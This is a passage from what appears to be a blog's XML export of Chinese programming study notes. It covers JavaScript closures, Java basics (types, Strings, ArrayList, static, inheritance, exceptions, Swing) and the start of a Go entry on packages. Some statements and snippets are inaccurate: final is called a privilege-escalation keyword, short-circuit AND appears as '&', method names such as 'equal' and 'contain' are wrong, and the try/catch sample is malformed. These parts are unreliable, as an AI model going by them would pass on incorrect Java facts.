2</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">counter2</span>(); <span class="comment">// 输出: 11</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="闭包陷阱"><a href="#闭包陷阱" class="headerlink" title="闭包陷阱"></a>闭包陷阱</h3><p>闭包这样子搞肯定是有问题的，很容易出现一些难以理解的问题，比如闭包陷阱，这个问题例子：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">addClickListeners</span> (buttons)&#123;</span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; buttons.<span class="property">length</span>; i++)&#123;</span><br><span class="line">      buttons[i].<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">         <span class="title function_">alert</span>(<span class="string">&quot;Clicked Button &quot;</span> + i);</span><br><span class="line">      &#125;);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> buttons;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> btns = <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;button&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">addClickListeners</span>(btns);</span><br></pre></td></tr></table></figure>
<p>这个问题我很难理解，在我的认知中，每次循环绑定点击事件，应该是没有问题的，i循环到多少就绑多少。但是这里有一个闭包函数。先说结果，结果就是每一个按钮点击后显示的结果都是<strong>Clicked Button 4</strong>，即都是一样的。再说我的理解，这里有一个闭包函数，就是clicked后面定义的函数。我们要理解的就是实际上我们给按钮绑定的事件是函数，而非那一行字，意思就是我们点击按钮，实际上是调用了这个闭包函数，而在我们点击函数的时候，循环早就结束了（这样我们才能点击按钮。也就是说，按钮确实绑定了点击事件，但是这个点击事件不是<strong>Clicked Button 1(2/3/4)</strong>，不是的，而是<strong>Clicked Button i</strong>，又因为闭包函数i共享的上一层函数的i，这样每次点击按钮，闭包函数调用i，而这个i，是上一层函数的i，而又因为上一层函数的i是var定义的，可作用于整个函数及其内部，所以这个i，他是<strong>共享的</strong>，这就导致了，i跟着循环走，走到哪一层，i就是什么，这样在点击按钮的时候，i早就走完了最后一层，那就是buttons.length。</p>
<p>这里就涉及到了闭包函数调用外层函数，var定义变量作用于函数作用域的问题，因此要想解决这个问题，主要思路就是：既然问题出在i共享了所有按钮，那么解决方案就是让它隔离开来，隔离的方法可以用let关键字，也可以用及时调用函数：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">addClickListeners</span>(<span class="params">buttons</span>) &#123;</span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; buttons.<span class="property">length</span>; i++) &#123;</span><br><span class="line">      (<span class="keyword">function</span>(<span class="params">i</span>) &#123;</span><br><span class="line">         buttons[i].<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Clicked Button &quot;</span> + i);</span><br><span class="line">         &#125;);</span><br><span class="line">      &#125;)(i);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> buttons;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>(function(i) { … })(i);这个及时调用方法可以立刻调用函数，也可以创建一个新的作用域，这意味着当我们点击按钮的时候，闭包函数先找的是上一个作用域，那就是这个立即调用函数的作用域，在这个作用域中的i就是先前处理得到的i，这样就可以隔绝开每一个i，避免让他们共享。而let的思路也是这样。</p>
]]></content>
      <categories>
        <category>项目开发</category>
        <category>语言语法</category>
      </categories>
      <tags>
        <tag>开发</tag>
        <tag>Java</tag>
        <tag>语法</tag>
      </tags>
  </entry>
  <entry>
    <title>Java入门基础</title>
    <url>/2022/07/02/Java%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<p> Java初学，包含使用IDEA创建文件，基本程序等等</p>
<span id="more"></span>
<h4 id="创建新的程序"><a href="#创建新的程序" class="headerlink" title="创建新的程序"></a>创建新的程序</h4><p><img src="https://s3.bmp.ovh/imgs/2023/01/06/a7457cc5a33c31bd.png" alt=""></p>
<p>如上图，创建一个JAVA程序的步骤依次向下创建，注意一个工程可以包含多个模块，一个模块可以包含多个包，一个包可以包含多个类。</p>
<h4 id="字面量-数据格式"><a href="#字面量-数据格式" class="headerlink" title="字面量(数据格式)"></a>字面量(数据格式)</h4><p>字符：用单引号括起来</p>
<p>字符串：用双引号括起来</p>
<p>空值：null</p>
<p>特殊字符：\n:换行符，\t:缩进符</p>
<p>默认整数是Int型，小数是double型，需要改变在数据后加上L/F。</p>
<h4 id="主要结构"><a href="#主要结构" class="headerlink" title="主要结构"></a>主要结构</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XXXXXX</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="原始类型与引用类型"><a href="#原始类型与引用类型" class="headerlink" title="原始类型与引用类型"></a>原始类型与引用类型</h4><p>原始类型共8种：char,boolean,byte,short,int,long,float,double</p>
<ul>
<li>byte：1字节，8位最大值：127</li>
<li>short：2字节，16位，32767</li>
<li>int：4字节，32位，$2^{31}-1$</li>
<li>long：8字节，64位，$2^{63}-1$</li>
<li>float：4字节，32位</li>
<li>double：8字节，64位</li>
</ul>
<p>剩下的都是引用类型，注意：<strong>String</strong>是引用类型</p>
<h4 id="局部变量，实例变量，类变量"><a href="#局部变量，实例变量，类变量" class="headerlink" title="局部变量，实例变量，类变量"></a>局部变量，实例变量，类变量</h4><h5 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h5><p>是类方法中的变量，使用之前需要被初始化</p>
<h5 id="实例变量"><a href="#实例变量" class="headerlink" title="实例变量"></a>实例变量</h5><p>独立于方法之外的变量，也叫<strong>对象变量</strong>，也是我们经常定义的变量，对象在内存中该变量才会进入内存中，定义时具有默认值，不需要初始化</p>
<h5 id="类变量（静态变量）"><a href="#类变量（静态变量）" class="headerlink" title="类变量（静态变量）"></a>类变量（静态变量）</h5><p>类变量是类中独立于方法之外的变量，用static 修饰，也叫 <strong>静态变量</strong>，只要程序开始执行就存在于内存中，定义时具有默认值，不需要初始化</p>
<h5 id="实例变量与类变量区别"><a href="#实例变量与类变量区别" class="headerlink" title="实例变量与类变量区别"></a>实例变量与类变量区别</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">A</span>&#123;</span><br><span class="line">    <span class="keyword">static</span>  <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">0</span>; <span class="comment">//类变量</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">0</span>; <span class="comment">//实例变量</span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">B</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">A</span> <span class="variable">a1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">A</span>();</span><br><span class="line">        <span class="type">A</span> <span class="variable">a2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">A</span>();</span><br><span class="line">        a1.a = <span class="number">3</span>;  <span class="comment">// 等同于 A.a = 3;</span></span><br><span class="line">        a1.b = <span class="number">4</span> ;</span><br><span class="line">        System.out.println(a2.a); <span class="comment">//结果为3</span></span><br><span class="line">        <span class="comment">//类变量是针对所有对象的，所以a1改变a，a2的a也改变</span></span><br><span class="line">        System.out.println(a2.b); <span class="comment">//结果为0</span></span><br><span class="line">        <span class="comment">//实例只改变自身的，所以a1对象的b改变，不影响对象a2的b变量</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="数据类型转换"><a href="#数据类型转换" class="headerlink" title="数据类型转换"></a>数据类型转换</h4><p>数据范围小的变量可以直接赋值给数据范围大的变量</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">byte</span> a=<span class="number">2</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span>a;</span><br><span class="line"><span class="type">double</span> c=b;</span><br><span class="line">System.out.println(b)</span><br></pre></td></tr></table></figure>
<p>另外注意在表达式中byte,short,char直接转化为Int型参与运算，因此byte+byte的结果类型必须定义为int。另外double&gt;float&gt;long&gt;int&gt;byte,short,char。一旦表达式有相应数据，则自动转化为大范围数据计算。</p>
<h4 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h4><ul>
<li>逻辑与”&amp;”:有一个为false,结果是false。</li>
<li>短路与”&amp;”:一个是false，结果是false。<strong>前一个是false，后面的条件就不执行了</strong></li>
<li>逻辑或”|”和短路或”||” <strong>同上解释</strong></li>
<li>逻辑非”!”</li>
<li>逻辑异或”^”:相同时false，不同时true</li>
</ul>
<h4 id="键盘录入"><a href="#键盘录入" class="headerlink" title="键盘录入"></a>键盘录入</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner<span class="comment">//导包</span></span><br><span class="line">    <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);<span class="comment">//建立对象 </span></span><br><span class="line">System.out.println(<span class="string">&quot;请输入密码：&quot;</span>)</span><br><span class="line"><span class="type">int</span> age=sc.nextInt()</span><br><span class="line">System.out.println(<span class="string">&quot;你输入的密码是：&quot;</span>+age)</span><br></pre></td></tr></table></figure>
<h4 id="关于空格，空行的方法"><a href="#关于空格，空行的方法" class="headerlink" title="关于空格，空行的方法"></a>关于空格，空行的方法</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.out.println(i+<span class="string">&quot;\t&quot;</span>)<span class="comment">//数据之间的空格操作</span></span><br><span class="line">System.out.println()<span class="comment">//数据的空行操作</span></span><br></pre></td></tr></table></figure>
<h4 id="案例小练习：猜数字"><a href="#案例小练习：猜数字" class="headerlink" title="案例小练习：猜数字"></a>案例小练习：猜数字</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> guessnumber;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">func</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Scanner sc=<span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        Random r=<span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> num=r.nextInt(<span class="number">100</span>)+<span class="number">1</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;已随机生成1-100的数字\n&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;请输入你猜的数字\n&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> input=sc.nextInt();</span><br><span class="line">            <span class="keyword">if</span>(input&gt;num) System.out.println(<span class="string">&quot;你猜的数字过大&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(input&lt;num) System.out.println(<span class="string">&quot;你猜的数字过小&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;正确！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span>[] arr=<span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">12</span>];</span><br><span class="line"><span class="type">int</span>[] ages=<span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;<span class="comment">//静态初始化</span></span><br><span class="line"><span class="type">int</span>[]=&#123;input&#125;;<span class="comment">//动态初始化</span></span><br><span class="line"><span class="type">int</span>[][] arr2=&#123;&#123;<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>&#125;,&#123;<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>&#125;&#125;;<span class="comment">//二维数组</span></span><br><span class="line">System.out.println(ages.length);<span class="comment">//求数组长度</span></span><br></pre></td></tr></table></figure>
<h4 id="方法重载"><a href="#方法重载" class="headerlink" title="方法重载"></a>方法重载</h4><p>同一个类，出现多个方法名称相同，形参列表不同这些方法叫重载方法。</p>
<p>p.s. 返回值类型没关系</p>
<p>如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="title function_">void</span><span class="params">()</span>&#123;</span><br><span class="line">	代码段<span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="title function_">void</span><span class="params">(String a)</span></span><br><span class="line">&#123;</span><br><span class="line">	代码段<span class="number">2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="return单独使用"><a href="#return单独使用" class="headerlink" title="return单独使用"></a>return单独使用</h4><p>单写一个return，</p>
<p>可以跳出并立即结束所在方法的执行</p>
<h4 id="生成随机字符"><a href="#生成随机字符" class="headerlink" title="生成随机字符"></a>生成随机字符</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char ch=(char) (ra.nextInt(26)+65);//生成随机大写字母</span><br><span class="line">char ch2=(char) (ra.nextInt(26)+97);//生成随机小写字母</span><br></pre></td></tr></table></figure>
<h4 id="String类常用api"><a href="#String类常用api" class="headerlink" title="String类常用api"></a>String类常用api</h4><p><strong>判断相等</strong>：在java中字符串内容比较不能使用”==”，因为java字符串表示的是地址。。</p>
<p>如：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">string name=<span class="string">&quot;zrm&quot;</span>;</span><br><span class="line">string password=<span class="string">&quot;123456&quot;</span>;</span><br><span class="line">string in_name,in_password;</span><br><span class="line">cin&gt;&gt;in_name&gt;&gt;in_password;</span><br><span class="line"><span class="keyword">if</span>(in_name==name&amp;&amp;in_password==password) cout&lt;&lt;<span class="string">&quot;正确&quot;</span>;</span><br><span class="line"><span class="keyword">else</span> cout&lt;&lt;<span class="string">&quot;错误&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>这一段C++代码是可以执行的，但是放在java中即使输入相同的名字密码都无法输出“正确”，因为定义的正确字符串存于常量区，而输入的字符串在堆内存中，两者的地址不一样，比较的结果是不相等。</p>
<p>因此需要用到一个判断内容相等的api：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String name=<span class="string">&quot;aaa&quot;</span>;</span><br><span class="line">String password=<span class="string">&quot;123456&quot;</span>；</span><br><span class="line">Scanner sc=<span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in)</span><br><span class="line"><span class="comment">//定义接受输入内容的对象....</span></span><br><span class="line">name.equal(in_name)<span class="comment">//判断name字符串和in_name字符串内容是否相等，包括大小写检验</span></span><br><span class="line">password.equalIgnoreCase(in_password)<span class="comment">//判断前后是否相等，忽略大小写</span></span><br></pre></td></tr></table></figure>
<p><strong>对字符串的操作</strong>:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String str=<span class="string">&quot;abcdefg&quot;</span>;</span><br><span class="line">str.length();<span class="comment">//求字符串长度</span></span><br><span class="line">str.charAt(<span class="type">int</span> num);<span class="comment">//求字符串特定位置字符</span></span><br><span class="line">str.toCharArray();<span class="comment">//把字符串转成字符数组</span></span><br><span class="line">str.substring(<span class="type">int</span> first,<span class="type">int</span> last);<span class="comment">//截取，包前不包后</span></span><br><span class="line">str.substring(<span class="type">int</span> first);<span class="comment">//截取，从当前索引一直截取到末尾</span></span><br><span class="line">str.replace(String before,String <span class="keyword">new</span>);<span class="comment">//替换，把前一个内容全部替换成后一个内容</span></span><br><span class="line">str.contain(String s);<span class="comment">//判断是否包含，是返回true,否则返回false</span></span><br><span class="line">str.startsWith(String str);<span class="comment">//判断是否以此字符串开始</span></span><br><span class="line">String str2=<span class="string">&quot;aaa,bbb,ccc&quot;</span>;</span><br><span class="line">str.split(<span class="string">&quot;,&quot;</span>);<span class="comment">//按照&quot;,&quot;分开，返回字符串数组，需要有一个字符串数组对象接收返回值</span></span><br></pre></td></tr></table></figure>
<h4 id="生成验证码第二种表达方式"><a href="#生成验证码第二种表达方式" class="headerlink" title="生成验证码第二种表达方式"></a>生成验证码第二种表达方式</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">special_number</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        String str=<span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890&quot;</span>;</span><br><span class="line">        Random ra=<span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">        String res=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> num=ra.nextInt(str.length());</span><br><span class="line">            <span class="type">char</span> c=str.charAt(num);</span><br><span class="line">            res+=c;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(res);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="ArrayList类"><a href="#ArrayList类" class="headerlink" title="ArrayList类"></a>ArrayList类</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ArrayList&lt;String&gt; list=<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();<span class="comment">//尖括号内约束数据类型</span></span><br><span class="line">list.add();<span class="comment">//直接添加</span></span><br><span class="line">list.add(<span class="type">int</span> index,type data);<span class="comment">//在指定位置插入元素</span></span><br><span class="line">list.get(<span class="type">int</span> index);<span class="comment">//获得指定位置元素</span></span><br><span class="line">list.size();<span class="comment">//获得元素个数</span></span><br><span class="line">list.remove(<span class="type">int</span> index);<span class="comment">//删除索引位置元素，返回被删除的元素值</span></span><br><span class="line">list.remove(Object o);<span class="comment">//删除容器内元素的值，如有多个相同值则删除第一个</span></span><br><span class="line">list.set(<span class="type">int</span> index,E element);<span class="comment">//修改索引位置的元素为后面的元素</span></span><br></pre></td></tr></table></figure>
<h4 id="static使用"><a href="#static使用" class="headerlink" title="static使用"></a>static使用</h4><p>静态成员变量有static修饰，可以被共享使用，访问格式为：类名.变量 or 对象.变量。一般用在需要被共享的信息中</p>
<p>实例成员变量无static修饰，只属于对象本身，访问格式为：对象.变量。一般用在每个对象共有的信息中</p>
<p>静态成员方法用static修饰时，可以直接使用方法名调用，不需要对象.方法</p>
<p>静态代码块：用于在程序启动时，进行静态资源初始化操作，格式：static{}</p>
<p>静态导入：static import，可以导入类或者接口的静态成员。</p>
<p>单例：保证一个类只有一个对象</p>
<h4 id="Final使用"><a href="#Final使用" class="headerlink" title="Final使用"></a>Final使用</h4><p>final 是用来提权的，但是在设计程序时，要注意程序或者方法的权限不可以超过它应有的权限高度，否则可能造成漏洞。final能指定一个变量强制不可被修改。</p>
<h4 id="enum使用"><a href="#enum使用" class="headerlink" title="enum使用"></a>enum使用</h4><p>枚举用于一组常数的集合，当这组集合的数包含了所有情况时就可以使用枚举，比如一周当中只能是7天中的一个。</p>
<p>比如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">SexEnum</span> &#123;</span><br><span class="line">    male,female;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">Color</span> &#123;</span><br><span class="line">    RED,BLUE,GREEN,BLACK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>之后便可以通过枚举类型名直接引用常量，如 SexEnum.male、Color.RED。</p>
<h5 id="枚举类"><a href="#枚举类" class="headerlink" title="枚举类"></a>枚举类</h5><p>Java 中的每一个枚举都继承自 java.lang.Enum 类。当定义一个枚举类型时，每一个枚举类型成员都可以看作是 Enum 类的实例，这些枚举成员默认都被 final、public, static 修饰，当使用枚举类型成员时，直接使用枚举名称调用成员即可。</p>
<p><img src="https://s3.bmp.ovh/imgs/2022/11/29/744e9003362cec6c.png" alt=""></p>
<p>另外枚举类可以自己新建方法。</p>
<h4 id="类与方法"><a href="#类与方法" class="headerlink" title="类与方法"></a>类与方法</h4><h5 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h5><p>非常常见的方法：Set方法 和 Get方法，<strong>Set</strong> methods are commonly called mutator methods.<strong>Get</strong> methods are commonly called accessor methods or query methods.</p>
<h5 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> class&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>抽象方法，抽象类由abstract修饰，不用声明具体的方法体。一个方法如果声明为抽象方法，则该类必须为抽象类。使用场景：</p>
<ul>
<li>一般作为父类，让子类继承</li>
<li>父类得知子类一定完成某种行为，但不知道具体行为，就先定义抽象方法，让子类具体定义</li>
</ul>
<p>注意：</p>
<ul>
<li><p>抽象类不一定有抽象方法，有抽象方法的类一定是抽象类。</p>
</li>
<li><p>一个类继承了抽象类，则它必须重写所有的抽象方法，否则它必须也定义为抽象类</p>
</li>
<li><p>抽象类得到了抽象方法，却失去了创建对象的能力（不能被实例化）</p>
</li>
</ul>
<h5 id="继承-extends"><a href="#继承-extends" class="headerlink" title="继承 extends"></a>继承 extends</h5><ul>
<li>超类（双亲类）：子类继承的来源</li>
<li>子类：继承父类的类</li>
</ul>
<h5 id="子类"><a href="#子类" class="headerlink" title="子类"></a>子类</h5><ul>
<li>子类构造函数的第一个任务是显式或隐式地调用其直接超类的构造函数</li>
<li>如果代码不包含对超类的构造函数的显式调用，那么Java将隐式地调用超类的默认或无参数构造函数</li>
</ul>
<h5 id="重写方法"><a href="#重写方法" class="headerlink" title="重写方法"></a>重写方法</h5><p>子类重写超类的方法，但如果父类方法带有final关键字，子类就无法重写了</p>
<h5 id="public，private，protected，default"><a href="#public，private，protected，default" class="headerlink" title="public，private，protected，default"></a>public，private，protected，default</h5><ul>
<li>public成员可被子类访问或直接引用成员对象或任何地方访问</li>
<li>private成员只能在该类中被调用，子类无法访问，只能通过本类的public或protected方法来访问</li>
<li>protected成员可以被本类和子类和同一包中其他类访问调用，子类方法可以直接用成员名称来引用，如果超类的protected方法变化，可能需要修改所有子类的方法</li>
<li>default成员，啥都不定义就是这个，不能从包外访问，只能在包内访问</li>
</ul>
<h5 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h5><p>多态允许定义接口并存在多个实现，主要有两种形式：</p>
<ul>
<li>编译时间多态性（通过方法重载实现的静态多态性）</li>
<li>运行时多态性（通过方法覆盖实现的动态方法调度）</li>
</ul>
<h4 id="try…catch-抛出异常"><a href="#try…catch-抛出异常" class="headerlink" title="try…catch 抛出异常"></a>try…catch 抛出异常</h4><p>编程时可以用try…来处理异常，</p>
<p><img src="https://s3.bmp.ovh/imgs/2022/12/06/67d15528807e588c.png" alt=""></p>
<p>最后一段可以使用finally</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    setAge(age);</span><br><span class="line">    openFile(filename);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">catch</span> <span class="title function_">age</span><span class="params">(IllegalArgumentException e)</span> &#123; </span><br><span class="line">    System.out.println(“Unchecked exception!<span class="string">&quot;);</span></span><br><span class="line"><span class="string">    System.err.println(e);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">    catch age(IOException e) &#123; </span></span><br><span class="line"><span class="string">    System.out.println(“Checked exception!&quot;</span>);</span><br><span class="line">    System.err.println(e);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">finally</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;Print this anyways.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="Java-Swing"><a href="#Java-Swing" class="headerlink" title="Java Swing"></a>Java Swing</h4><ul>
<li>动作监听器：监听由可点击的组件触发的事件，如按钮，组合框，菜单等等</li>
<li>项目侦听器：侦听由实现项目可选择接口的组件触发的事件，如复选框、复选菜单项、组合框等。</li>
<li>窗口监听器-侦听在一些窗口活动后触发的事件，如打开或关闭窗口，对焦和离焦窗口，最大化窗口，等等。</li>
</ul>
<p><strong>JFrame</strong> – java的GUI程序的基本思路是以JFrame为基础，它是屏幕上window的对象，能够最大化、最小化、关闭。</p>
<p><strong>JPanel</strong> – Java图形用户界面(GUI)工具包swing中的面板容器类，包含在javax.swing 包中，可以进行嵌套，功能是对窗体中具有相同逻辑功能的组件进行组合，是一种轻量级容器，可以加入到JFrame窗体中。。</p>
<p><strong>JLabel</strong> – JLabel 对象可以显示文本、图像或同时显示二者。可以通过设置垂直和水平对齐方式，指定标签显示区中标签内容在何处对齐。默认情况下，标签在其显示区内垂直居中对齐。默认情况下，只显示文本的标签是开始边对齐；而只显示图像的标签则水平居中对齐。</p>
<p><strong>JTextField</strong> –一个轻量级组件，它允许编辑单行文本。</p>
<p><strong>JPasswordField</strong> – 允许我们输入了一行字像输入框，但隐藏星号(*) 或点创建密码(密码)</p>
<p><strong>JButton</strong> – JButton 类的实例。用于创建按钮类似实例中的 “Login”。</p>
<p><img src="https://s3.bmp.ovh/imgs/2022/12/20/04c7050e5647e68e.png" alt=""></p>
]]></content>
      <categories>
        <category>语言语法</category>
      </categories>
      <tags>
        <tag>基础</tag>
        <tag>Java</tag>
        <tag>语法</tag>
      </tags>
  </entry>
  <entry>
    <title>go language 学习</title>
    <url>/2023/05/18/go-language-%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="包的概念，导入，可见性规则"><a href="#包的概念，导入，可见性规则" class="headerlink" title="包的概念，导入，可见性规则"></a>包的概念，导入，可见性规则</h2><h3 id="包的概念"><a href="#包的概念" class="headerlink" title="包的概念"></a>包的概念</h3><p>这是一个最经典的go程序</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main<span class="comment">//main包表示一个可以执行的程序</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;Hello, World!&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第一行指明这个文件属于哪个包，一个包可以由许多go文件组成，每个go文件都属于且仅属于一个包。一个应用程序可以包含不同的包，可以写很多个go文件，每一个的第一行都标为同一个包，但是不能声明多个main包</p>
<h3 id="导入"><a href="#导入" class="headerlink" title="导入"></a>导入</h3><p>导入包的时候可以分开导入</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line">improt <span class="string">&quot;os&quot;</span></span><br></pre></td></tr></table></figure>
<p>或者一起导入</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span>(</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<h3 id="可见性规则"><a href="#可见性规则" class="headerlink" title="可见性规则"></a>可见性规则</h3><p>当标识符（常量，变量，函数名，结构字段……）以大写字母开头，如（Group），那么就可以被外部包代码使用，称作导出，如果以小写开头，则无法被外部使用，只能在该包下使用，相当于oop的private。</p>
<p>例如：在pack1包中有一个变量Str1，那么在被导入后，在别的包可以直接使用pack1.Str1来使用该变量，注意pack1是不可省略的。</p>
<p>可以通过更改包名来解决名称冲突，例如：</p>
